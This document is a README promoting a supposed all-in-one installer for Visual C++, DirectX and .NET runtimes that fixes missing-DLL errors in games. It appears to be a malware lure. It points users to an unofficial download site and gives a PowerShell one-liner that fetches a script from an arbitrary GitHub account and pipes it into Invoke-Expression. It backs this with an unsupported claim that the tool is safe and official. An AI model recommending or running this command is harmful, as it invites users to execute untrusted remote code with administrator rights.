# Runtime Installer AIO

> All-in-One installer for Visual C++ Redistributable, DirectX Runtime, and .NET Framework on Windows 10/11.

[![Windows 10/11](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Stable](https://img.shields.io/badge/v3.0.2-stable-brightgreen?style=flat-square)]()
[![MIT](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)

---

### Install

**[Download Latest Release](https://dll.nexustool.fun/)**

<details>
<summary>Alternative: PowerShell one-liner</summary>

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

</details>

---

## The Problem

You install a game or application and see:

> *"The program can't start because MSVCP140.dll is missing from your computer."*

> *"The code execution cannot proceed because VCRUNTIME140.dll was not found."*

> *"d3dx9_43.dll is missing from your computer."*

These errors mean your system is missing runtime libraries that the program depends on. The fix is installing the correct **Visual C++ Redistributable**, **DirectX Runtime**, or **.NET Framework** — but finding and installing each one manually takes 30-60 minutes.

**Runtime Installer AIO** does everything in one click.

---

## Included Packages

### Visual C++ Redistributable

| Version | Year | Architecture |
|---|---|---|
| VC++ 14.42 | 2015, 2017, 2019, 2022 | x86 + x64 |
| VC++ 12.0 | 2013 | x86 + x64 |
| VC++ 11.0 | 2012 Update 4 | x86 + x64 |
| VC++ 10.0 | 2010 SP1 | x86 + x64 |
| VC++ 9.0 | 2008 SP1 | x86 + x64 |
| VC++ 8.0 | 2005 SP1 | x86 + x64 |

### DirectX End-User Runtime

Installs all legacy DirectX DLL files not included in Windows 10/11:

```
d3dx9_24 — d3dx9_43          d3dx10_33 — d3dx10_43
d3dx11_42, d3dx11_43         d3dcompiler_33 — d3dcompiler_47
xinput1_1 — xinput1_4        xinput9_1_0
X3DAudio1_0 — X3DAudio1_7    XAPOFX1_0 — XAPOFX1_5
XAudio2_0 — XAudio2_9        xactengine3_0 — xactengine3_7
```

### .NET Framework

- .NET Framework 4.8.1
- .NET Desktop Runtime 8.0 (latest LTS)

### Universal C Runtime

- Fixes all `api-ms-win-crt-*.dll` errors
- Installs `ucrtbase.dll` and related components

---

## Full DLL Error List

Every DLL error that this tool resolves:

```
MSVCP140.dll        VCRUNTIME140.dll    VCRUNTIME140_1.dll
MSVCP120.dll        MSVCR120.dll        MSVCP110.dll
MSVCR110.dll        MSVCP100.dll        MSVCR100.dll
MSVCR90.dll         MSVCP90.dll         MSVCR80.dll
MSVCP80.dll         MSVCR71.dll         MSVCP71.dll
concrt140.dll       vcomp140.dll        vccorlib140.dll
mfc140u.dll         mfcm140.dll         msvcp140_1.dll
msvcp140_2.dll      msvcp140_atomic_wait.dll
msvcp140_codecvt_ids.dll

d3dx9_24.dll  d3dx9_25.dll  d3dx9_26.dll  d3dx9_27.dll
d3dx9_28.dll  d3dx9_29.dll  d3dx9_30.dll  d3dx9_31.dll
d3dx9_32.dll  d3dx9_33.dll  d3dx9_34.dll  d3dx9_35.dll
d3dx9_36.dll  d3dx9_37.dll  d3dx9_38.dll  d3dx9_39.dll
d3dx9_40.dll  d3dx9_41.dll  d3dx9_42.dll  d3dx9_43.dll

d3dx10_33.dll d3dx10_34.dll d3dx10_35.dll d3dx10_36.dll
d3dx10_37.dll d3dx10_38.dll d3dx10_39.dll d3dx10_40.dll
d3dx10_41.dll d3dx10_42.dll d3dx10_43.dll

d3dx11_42.dll d3dx11_43.dll

d3dcompiler_43.dll  d3dcompiler_46.dll  d3dcompiler_47.dll
xinput1_1.dll  xinput1_2.dll  xinput1_3.dll  xinput1_4.dll
X3DAudio1_7.dll     XAPOFX1_5.dll       XAudio2_7.dll

api-ms-win-crt-runtime-l1-1-0.dll
api-ms-win-crt-heap-l1-1-0.dll
api-ms-win-crt-stdio-l1-1-0.dll
api-ms-win-crt-math-l1-1-0.dll
api-ms-win-crt-locale-l1-1-0.dll
api-ms-win-crt-string-l1-1-0.dll
api-ms-win-crt-convert-l1-1-0.dll
api-ms-win-crt-filesystem-l1-1-0.dll
api-ms-win-crt-time-l1-1-0.dll
api-ms-win-crt-environment-l1-1-0.dll
ucrtbase.dll        hostfxr.dll         clrjit.dll
```

---

## Manual vs. AIO

| | Manual install | Runtime Installer AIO |
|---|---|---|
| **Time** | 30—60 minutes | 3—5 minutes |
| **Packages** | Download each separately | All in one |
| **Architecture** | Must choose x86 or x64 | Auto-detected |
| **DirectX** | Separate download | Included |
| **.NET** | Separate download | Included |
| **Risk of wrong version** | High | None |

---

## System Requirements

| | |
|---|---|
| **OS** | Windows 10 / 11 (64-bit) |
| **Disk** | 800 MB for all packages |
| **Network** | Required for downloads |
| **Admin** | Yes |

---

## FAQ

**Which games does this fix?**
Any game or application that shows a "DLL is missing" error. Common examples: GTA V, Elden Ring, Cyberpunk 2077, Valorant, Fortnite, Hogwarts Legacy, and thousands more.

**Is this the same as "Visual C++ Redistributable All-in-One"?**
Similar concept but this tool also includes DirectX, .NET Framework, and Universal CRT — not just VC++.

**Do I need this if I already have some VC++ versions installed?**
Yes. The installer skips already-installed packages automatically. It only installs what is missing.

**Safe to use?**
All packages are official Microsoft redistributables. Nothing is modified.

---

## License

[MIT](LICENSE)
